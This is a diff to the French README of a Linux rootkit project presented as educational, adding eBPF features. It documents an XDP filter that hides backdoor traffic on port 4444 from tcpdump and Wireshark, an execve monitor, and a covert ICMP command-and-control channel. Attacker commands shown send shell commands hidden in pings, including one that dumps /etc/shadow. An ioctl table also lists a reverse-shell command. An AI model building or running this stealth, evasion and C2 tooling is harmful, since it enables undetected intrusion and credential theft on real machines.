@@ -1,18 +1,25 @@
 # Rootkit Linux - Module Noyau Educatif
 
 Projet educatif de developpement d'un rootkit sous forme de module noyau Linux (LKM).
-Le rootkit utilise **ftrace** pour hooker les appels systeme et **kprobes** pour resoudre les symboles noyau.
+Le rootkit combine deux approches :
+- **Module noyau (LKM)** : utilise **ftrace** pour hooker les appels systeme et **kprobes** pour resoudre les symboles noyau
+- **eBPF** : programmes XDP et tracepoints pour la manipulation reseau et la surveillance systeme
 
 **Architecture** : x86-64  
-**Interface** : peripherique misc `/dev/rootkit` + commandes ioctl  
+**Interface** : peripherique misc `/dev/rootkit` + commandes ioctl + maps BPF  
 **Acces** : restreint aux UID 0 (root) et 1000  
 
 ## Compilation
 
 ```bash
-make        # compile le module rootkit.ko et le binaire rootkit_malware
-make clean  # nettoie les fichiers generes
+make            # compile tout : module noyau + userspace + eBPF
+make modules    # module noyau seul
+make userspace  # binaire rootkit_malware seul
+make ebpf       # programmes eBPF + loader seul
+make clean      # nettoie tous les fichiers generes
 ```
+
+**Dependances eBPF** : `clang`, `libbpf-dev`, `libelf-dev`, `zlib1g-dev`
 
 ## Chargement / Dechargement
 
@@ -281,3 +288,175 @@ Commande utilitaire pour verifier l'UID du processus appelant.
 | `RK_CMD_PROTECT_FILE`      | 12  | W         | Proteger un fichier                  |
 | `RK_CMD_UNPROTECT_FILE`    | 13  | W         | Retirer la protection d'un fichier   |
 | `RK_CMD_REVERSE_SHELL`     | 14  | W         | Lancer un reverse shell              |
+
+---
+
+## Fonctionnalites eBPF
+
+Les programmes eBPF fonctionnent **independamment** du module noyau. Ils sont charges depuis l'espace utilisateur via `libbpf` et s'attachent a des points d'accroche XDP (reseau) ou tracepoints (systeme). La communication entre noyau et userspace se fait via des **BPF maps** (hash maps, arrays, ring buffers).
+
+Le loader unifie est : `ebpf/rk_ebpf_loader`
+
+```bash
+sudo ./ebpf/rk_ebpf_loader <commande> [args]
+```
+
+---
+
+### 16. Dissimulation de paquets reseau (XDP anti-tcpdump)
+
+Programme **XDP** qui inspecte chaque paquet entrant au niveau le plus bas de la pile reseau (avant `AF_PACKET`). Si le port source ou destination correspond a un port cache, le paquet est silencieusement **DROP** avant meme qu'il n'atteigne la couche de capture.
+
+**Resultat** : les paquets du backdoor sont completement invisibles a `tcpdump`, `wireshark`, `tshark` et tout outil base sur `AF_PACKET`/`libpcap`.
+
+```bash
+# Attacher le filtre XDP sur l'interface reseau
+sudo ./ebpf/rk_ebpf_loader xdp_attach eth0
+
+# Activer le filtrage
+sudo ./ebpf/rk_ebpf_loader xdp_enable
+
+# Cacher le port du backdoor
+sudo ./ebpf/rk_ebpf_loader xdp_hide_port 4444
+
+# Rendre un port visible a nouveau
+sudo ./ebpf/rk_ebpf_loader xdp_unhide_port 4444
+
+# Desactiver le filtrage (sans detacher)
+sudo ./ebpf/rk_ebpf_loader xdp_disable
+
+# Detacher completement le programme XDP
+sudo ./ebpf/rk_ebpf_loader xdp_detach eth0
+```
+
+**Programme BPF** : `ebpf/xdp_hide.bpf.c`  
+**Type** : XDP (`BPF_PROG_TYPE_XDP`)  
+**Maps** :
+- `hidden_ports` (hash) : ports a cacher (cle = port, valeur = 1)
+- `xdp_enabled` (array) : flag d'activation (0 = off, 1 = on)
+
+---
+
+### 17. Moniteur d'execution (tracepoint execve)
+
+Programme **tracepoint** qui se branche sur `sched:sched_process_exec` pour capturer **chaque execution de programme** sur le systeme. Les informations collectees sont :
+
+- **PID** du nouveau processus
+- **UID** de l'utilisateur
+- **PPID** du processus parent
+- **comm** (nom du processus)
+- **filename** (chemin complet de l'executable)
+
+Les evenements sont transmis en temps reel au userspace via un **ring buffer BPF**.
+
+```bash
+# Attacher le moniteur et afficher en temps reel
+sudo ./ebpf/rk_ebpf_loader exec_watch
+
+# Exemple de sortie :
+# [EXEC] pid=12345  uid=1000  ppid=1234   comm=bash             file=/usr/bin/ls
+# [EXEC] pid=12346  uid=0     ppid=1       comm=cron             file=/usr/sbin/logrotate
+
+# Attacher sans affichage (mode daemon)
+sudo ./ebpf/rk_ebpf_loader exec_attach
+```
+
+**Programme BPF** : `ebpf/exec_monitor.bpf.c`  
+**Type** : Tracepoint (`BPF_PROG_TYPE_TRACEPOINT`)  
+**Maps** :
+- `exec_events` (ring buffer, 256 Ko) : evenements d'execution
+- `exec_enabled` (array) : flag d'activation
+
+---
+
+### 18. Canal C2 covert via ICMP
+
+Programme **XDP** qui intercepte les paquets **ICMP Echo Request** (ping) contenant un motif magique (`0xDEAD1337`) dans le payload. La commande cachee dans le reste du payload est extraite, transmise au userspace via ring buffer, puis executee. Le paquet ICMP est ensuite **DROP** pour ne laisser aucune trace reseau.
+
+Ce mecanisme permet un canal de **commande et controle (C2)** totalement covert :
+- Le trafic ressemble a un simple ping
+- Les paquets C2 ne sont jamais delivres a la pile reseau (drop XDP)
+- Aucune connexion TCP/UDP n'est ouverte
+- Invisible aux IDS/IPS bases sur les connexions
+
+```bash
+# Cote cible : attacher et ecouter les commandes C2
+sudo ./ebpf/rk_ebpf_loader c2_watch eth0
+
+# Cote attaquant : envoyer une commande cachee dans un ping
+sudo python3 ebpf/icmp_c2_send.py 192.168.1.100 "id > /tmp/.rk_out"
+sudo python3 ebpf/icmp_c2_send.py 192.168.1.100 "cat /etc/shadow > /tmp/.rk_shadow"
+
+# Attacher sans ecoute (mode daemon)
+sudo ./ebpf/rk_ebpf_loader c2_attach eth0
+
+# Detacher le canal C2
+sudo ./ebpf/rk_ebpf_loader c2_detach eth0
+```
+
+**Programme BPF** : `ebpf/icmp_c2.bpf.c`  
+**Script attaquant** : `ebpf/icmp_c2_send.py`  
+**Type** : XDP (`BPF_PROG_TYPE_XDP`)  
+**Maps** :
+- `icmp_cmd_events` (ring buffer, 256 Ko) : commandes recues
+- `icmp_c2_enabled` (array) : flag d'activation  
+**Magic** : `0xDEAD1337` (4 octets en debut de payload ICMP)
+
+---
+
+## Architecture eBPF
+
+```
+                     Espace utilisateur
+    ┌─���────────────────────────────────────────────┐
+    │  rk_ebpf_loader          icmp_c2_send.py     │
+    │    │                        │                 │
+    │    ├─ libbpf (chargement)   └─ raw socket     │
+    │    ├─ ring_buffer (lecture)     ICMP           │
+    │    └─ bpf maps (config)                       │
+    └────────┬──────────────────────────────────────┘
+             │  BPF syscall
+    ═════════╪══════════════════════════════════════════
+             │  Espace noyau
+    ┌────���───┴──────────────────────────────────────┐
+    │                                               │
+    │  XDP hook (NIC driver)                        │
+    │    ├─ xdp_hide.bpf.o     → DROP ports caches │
+    │    └─ icmp_c2.bpf.o      → DROP + extract C2 │
+    │                                               │
+    │  Tracepoint (sched_process_exec)              │
+    │    └─ exec_monitor.bpf.o → ring buffer events │
+    │                                               │
+    │  BPF Maps (donnees partagees)                 │
+    │    ├─ hidden_ports   (hash)                   │
+    │    ├─ xdp_enabled    (array)                  │
+    │    ├─ exec_events    (ringbuf)                │
+    │    ├─ exec_enabled   (array)                  │
+    │    ├─ icmp_cmd_events(ringbuf)                │
+    │    └─ icmp_c2_enabled(array)                  ��
+    └───────────────────────────────────────────────┘
+```
+
+## Resume des programmes eBPF
+
+| Programme            | Type       | Fonctionnalite                          | Maps                              |
+|----------------------|------------|-----------------------------------------|-----------------------------------|
+| `xdp_hide.bpf.o`    | XDP        | Drop paquets vers/depuis ports caches   | `hidden_ports`, `xdp_enabled`     |
+| `exec_monitor.bpf.o`| Tracepoint | Surveillance de toutes les executions   | `exec_events`, `exec_enabled`     |
+| `icmp_c2.bpf.o`     | XDP        | Canal C2 covert via ICMP ping           | `icmp_cmd_events`, `icmp_c2_enabled` |
+
+## Commandes du loader eBPF
+
+| Commande                        | Description                              |
+|---------------------------------|------------------------------------------|
+| `xdp_attach <iface>`           | Attacher le filtre XDP                   |
+| `xdp_detach <iface>`           | Detacher le filtre XDP                   |
+| `xdp_hide_port <port>`         | Cacher un port du trafic capture         |
+| `xdp_unhide_port <port>`       | Rendre un port visible                   |
+| `xdp_enable`                   | Activer le filtre XDP                    |
+| `xdp_disable`                  | Desactiver le filtre XDP                 |
+| `exec_watch`                   | Surveiller les executions en temps reel  |
+| `exec_attach`                  | Attacher le moniteur sans affichage      |
+| `c2_watch <iface>`             | Ecouter les commandes C2 ICMP           |
+| `c2_attach <iface>`            | Attacher le C2 sans ecoute              |
+| `c2_detach <iface>`            | Detacher le canal C2                     |
